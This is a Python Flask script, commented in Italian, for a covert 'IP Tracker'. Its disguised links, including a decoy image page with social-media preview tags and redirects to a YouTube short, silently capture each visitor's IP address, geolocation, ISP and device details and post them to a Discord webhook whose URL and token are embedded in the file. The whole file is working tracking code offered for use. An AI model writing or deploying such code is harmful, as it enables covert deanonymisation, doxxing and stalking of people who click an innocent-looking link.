from flask import Flask, request, redirect
from datetime import datetime
import requests
import os
import re
import time

app = Flask(__name__)

# ============ CONFIGURAZIONE ============
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
REDIRECT_URL = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"

# ============ FUNZIONI ============

def get_ip_info(ip):
    """Ottiene info geolocalizzazione complete"""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "countryCode": data.get("countryCode", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "zip": data.get("zip", "N/D"),
                    "lat": data.get("lat", "N/D"),
                    "lon": data.get("lon", "N/D"),
                    "timezone": data.get("timezone", "N/D"),
                    "isp": data.get("isp", "N/D"),
                    "org": data.get("org", "N/D"),
                    "as": data.get("as", "N/D"),
                    "asname": data.get("asname", "N/D"),
                    "reverse": data.get("reverse", "N/D"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except:
        pass
    return None

def get_device_info(request):
    """Analizza User-Agent per info dispositivo"""
    ua = request.headers.get('User-Agent', '')
    
    info = {
        "browser": "Sconosciuto",
        "browser_version": "",
        "os": "Sconosciuto",
        "os_version": "",
        "device": "Desktop",
        "is_mobile": False,
        "is_bot": False
    }
    
    # OS Detection
    if 'Windows NT 10' in ua: info["os"] = "Windows 10/11"
    elif 'Mac OS X' in ua: info["os"] = "macOS"
    elif 'Android' in ua:
        info["os"] = "Android"
        info["is_mobile"] = True
        info["device"] = "Mobile"
        v = re.search(r'Android (\d+\.\d+)', ua)
        if v: info["os_version"] = v.group(1)
    elif 'iPhone' in ua:
        info["os"] = "iOS"
        info["is_mobile"] = True
        info["device"] = "iPhone"
    elif 'iPad' in ua:
        info["os"] = "iOS"
        info["device"] = "iPad"
    elif 'Linux' in ua: info["os"] = "Linux"
    
    # Browser Detection
    if 'Edg/' in ua:
        info["browser"] = "Edge"
        v = re.search(r'Edg/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Firefox/' in ua:
        info["browser"] = "Firefox"
        v = re.search(r'Firefox/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Chrome/' in ua:
        info["browser"] = "Chrome"
        v = re.search(r'Chrome/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Safari/' in ua: info["browser"] = "Safari"
    
    # Bot Detection
    bots = ['bot', 'crawler', 'spider', 'curl', 'wget']
    if any(b in ua.lower() for b in bots): info["is_bot"] = True
    
    return info

def get_all_ips(request):
    """Estrae tutti gli IP dalla richiesta"""
    ips = {
        "ip_pubblico": "N/D",
        "ip_locale": "N/D",
        "remote_addr": request.remote_addr
    }
    
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip_list = [ip.strip() for ip in forwarded.split(',')]
        if ip_list:
            ips["ip_pubblico"] = ip_list[0]
    
    if request.remote_addr.startswith(('192.168.', '10.', '172.', '127.')):
        ips["ip_locale"] = request.remote_addr
    
    return ips

def send_to_discord(ip_data, ip_info, device_info, route_name):
    """Invia report completo a Discord"""
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    ua = request.headers.get('User-Agent', '')[:200]
    lang = request.headers.get('Accept-Language', 'N/D')
    referrer = request.headers.get('Referer', 'N/D')
    
    description = f"**📅 Data:** `{date}`\n"
    description += f"**🛤️ Route:** `{route_name}`\n\n"
    
    # IP
    description += "**🌐 INDIRIZZI IP**\n"
    description += f"🔢 Pubblico: `{ip_data['ip_pubblico']}`\n"
    if ip_data['ip_locale'] != 'N/D':
        description += f"🏠 Locale: `{ip_data['ip_locale']}`\n"
    
    # Posizione
    if ip_info:
        description += "\n**📍 POSIZIONE**\n"
        description += f"🌍 {ip_info.get('country', '?')} - {ip_info.get('city', '?')}, {ip_info.get('region', '?')}\n"
        description += f"📍 {ip_info.get('lat', '?')}, {ip_info.get('lon', '?')}\n"
        description += f"📡 {ip_info.get('isp', '?')}\n"
        flags = []
        if ip_info.get('mobile'): flags.append("📱")
        if ip_info.get('proxy'): flags.append("🔒")
        if flags: description += f"🚩 {' '.join(flags)}\n"
    
    # Dispositivo
    description += "\n**💻 DISPOSITIVO**\n"
    description += f"🖥️ {device_info['os']} | 🌐 {device_info['browser']} {device_info['browser_version']}\n"
    description += f"📱 {device_info['device']}\n"
    if lang: description += f"🔤 {lang[:80]}\n"
    if referrer != 'N/D': description += f"🔗 {referrer[:80]}\n"
    
    data = {
        "content": f"🔔 **{ip_info.get('country', '?')}** - `{ip_data['ip_pubblico']}`",
        "embeds": [{
            "title": "🎯 REPORT",
            "description": description,
            "color": 5814783,
            "timestamp": date,
            "footer": {"text": "IP Tracker"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=10)
    except:
        pass

# ============ ROUTES ============

@app.route("/")
def home():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, "Home")
    return redirect(REDIRECT_URL)

@app.route("/img")
def image():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, "Immagine")
    return f"""<!DOCTYPE html><html><head><meta property="og:title" content="Guarda!"><meta property="og:image" content="{IMAGE_URL}"><style>*{{margin:0;padding:0}}body{{background:#1a1a1a;display:flex;justify-content:center;align-items:center;height:100vh;cursor:pointer}}img{{max-width:90vw;max-height:80vh;border-radius:10px}}</style></head><body onclick="location.href='{REDIRECT_URL}'"><img src="{IMAGE_URL}"></body></html>"""

@app.route("/video")
@app.route("/shorts")
def video():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, "Video")
    return redirect(REDIRECT_URL)

# ============ AVVIO ============
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
